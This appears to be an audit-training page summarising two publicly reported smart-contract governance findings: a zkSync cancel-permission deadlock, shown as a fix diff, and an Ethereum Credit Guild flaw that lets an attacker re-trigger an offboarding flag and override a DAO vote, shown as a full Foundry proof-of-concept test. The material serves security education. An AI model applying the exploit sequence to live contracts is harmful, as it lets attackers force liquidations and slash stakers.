# ETAAcademy-Adudit: 2. Governance

<table>
  <tr>
    <th>title</th>
    <th>tags</th>
  </tr>
  <tr>
    <td>02. Block</td>
    <td>
      <table>
        <tr>
          <th>audit</th>
          <th>basic</th>
          <th>Governance</th>
          <td>governance</td>
        </tr>
      </table>
    </td>
  </tr>
</table>

[Github](https://github.com/ETAAcademy)｜[Twitter](https://twitter.com/ETAAcademy)｜[ETA-Audit](https://github.com/ETAAcademy/ETAAcademy-Audit)

Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining

## 1.[Medium] Governance logic may enter a deadlock

### Key actors manipulate governance mechanism

- Summary: If compromised, key actors like the security council or owner could prevent upgrades or manipulate the governance mechanism, leading to operational challenges.
- Impact & Recommendation: To mitigate this the possibility of a governance deadlock , suggested solutions include restricting the cancel permission to only the owner, and implementing a minimum upgrade delay to prevent instant upgrades, giving users time to react in case of malicious actions.
  🐬: [Source](https://github.com/code-423n4/2023-10-zksync-findings/issues/260) & [Report](https://code4rena.com/reports/2023-10-zksync)

  <details><summary>POC</summary>

  ```solidity

    -   function cancel(bytes32 _id) external onlyOwnerOrSecurityCouncil {
    +   function cancel(bytes32 _id) external onlyOwner {
            require(isOperationPending(_id), "Operation must be pending");
            delete timestamps[_id];
            emit OperationCancelled(_id);
        }

        function updateDelay(uint256 _newDelay) external onlySelf {
    +       require(_newDelay >= MINIMUM_UPGRADE_DELAY, "whatever";)
            emit ChangeMinDelay(minDelay, _newDelay);
            minDelay = _newDelay;
        }

  ```

  </details>

## 2. [Medium] Re-triggering the canOffboard[term] flag to bypass the DAO vote of the lending term offboarding mechanism

### Offboarding lending term

- Summary: The vulnerability allows an attacker to repeatedly trigger offboarding a re-onboarding lending term, bypassing the DAO vote offboarding mechanism. Even after the term is offboarded and cleaned up, the attacker can trigger another offboarding vote before the poll ends, to re-trigger the `canOffboard[term]` flag. This enables the attacker to force offboarding of the re-onboarded term at any time, overriding the DAO vote.

- Impact & Recommendation: The attack not only manipulates offboarding but also triggers silent auctions for existing loans. If a loan fails to attract bids, causing a loss, stakers who voted for the term via the SurplusGuildMinter contract are slashed, impacting both borrowers and stakers significantly. Prevent the offboarding poll from reactivating the `canOffboard[term]` flag after the lending term cleanup, or end the poll if the term has been cleaned up.
  🐬: [Source](https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/1141) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity

    function testPoCBreakingDaoVoteOffboarding() public {
        // Prepare for Attacker
        address Attacker = address(1);
        guild.mint(Attacker, 1);
        vm.prank(Attacker);
        guild.delegate(Attacker);
        // Prepare for Bob
        guild.mint(bob, _QUORUM);
        vm.startPrank(bob);
        guild.delegate(bob);
        uint256 POLL_DURATION_BLOCKS = offboarder.POLL_DURATION_BLOCKS();
        uint256 snapshotBlock = block.number;
        uint256 OFFBOARDING_POLL_END_BLOCK = snapshotBlock + POLL_DURATION_BLOCKS;
        // Bob proposes an offboarding of the term
        assertEq(guild.isGauge(address(term)), true);
        offboarder.proposeOffboard(address(term));
        // Next 1 day
        vm.roll(block.number + 6646); // 1 day
        vm.warp(block.timestamp + 6646 * 13);
        assertLe(block.number, OFFBOARDING_POLL_END_BLOCK);
        vm.expectRevert("LendingTermOffboarding: quorum not met");
        offboarder.cleanup(address(term));
        // Bob votes for offboarding the term and executes the offboarding (he has a sufficient voting weight)
        assertEq(guild.isGauge(address(term)), true);
        assertEq(offboarder.canOffboard(address(term)), false);
        offboarder.supportOffboard(snapshotBlock, address(term));
        offboarder.offboard(address(term));
        assertEq(guild.isGauge(address(term)), false);
        assertEq(offboarder.canOffboard(address(term)), true);
        // Cannot clean up because loans are active
        vm.expectRevert("LendingTermOffboarding: not all loans closed");
        offboarder.cleanup(address(term));
        // Next 1 day
        vm.roll(block.number + 6646); // 1 day
        vm.warp(block.timestamp + 6646 * 13);
        assertLe(block.number, OFFBOARDING_POLL_END_BLOCK);
        // Get enough CREDIT to pack back interests
        vm.stopPrank();
        uint256 debt = term.getLoanDebt(aliceLoanId);
        credit.mint(alice, debt - aliceLoanSize);
        // Alice closes loan
        vm.startPrank(alice);
        credit.approve(address(term), debt);
        term.repay(aliceLoanId);
        vm.stopPrank();
        // Clean up the term
        assertEq(psm.redemptionsPaused(), true);
        assertEq(offboarder.nOffboardingsInProgress(), 1);
        offboarder.cleanup(address(term));
        assertEq(psm.redemptionsPaused(), false);
        assertEq(offboarder.nOffboardingsInProgress(), 0);
        assertEq(offboarder.canOffboard(address(term)), false); // The canOffboard[term] flag has been reset
        assertEq(core.hasRole(CoreRoles.RATE_LIMITED_CREDIT_MINTER, address(term)), false);
        assertEq(core.hasRole(CoreRoles.GAUGE_PNL_NOTIFIER, address(term)), false);
        // Attacker votes for offboarding the term to re-trigger the canOffboard[term] flag again
        vm.startPrank(Attacker);
        assertEq(offboarder.canOffboard(address(term)), false);
        offboarder.supportOffboard(snapshotBlock, address(term));
        assertEq(offboarder.canOffboard(address(term)), true); // Attacker has re-triggered the canOffboard[term] flag
        vm.stopPrank();
        // Next 10 days
        // Offboarding poll expired
        vm.roll(block.number + 66460); // 10 days
        vm.warp(block.timestamp + 66460 * 13);
        assertGt(block.number, OFFBOARDING_POLL_END_BLOCK);
        // The term is re-onboarded
        assertEq(guild.isGauge(address(term)), false);
        guild.addGauge(1, address(term));
        assertEq(guild.isGauge(address(term)), true);
        // Next 30 days
        vm.roll(block.number + 199380); // 30 days
        vm.warp(block.timestamp + 199380 * 13);
        assertEq(guild.isGauge(address(term)), true);
        assertEq(psm.redemptionsPaused(), false);
        assertEq(offboarder.nOffboardingsInProgress(), 0);
        // Attacker offboards the term by overriding the DAO vote offboarding mechanism
        vm.startPrank(Attacker);
        offboarder.offboard(address(term));
        assertEq(guild.isGauge(address(term)), false);
        assertEq(psm.redemptionsPaused(), true);
        assertEq(offboarder.nOffboardingsInProgress(), 1);
    }

  ```

  </details>
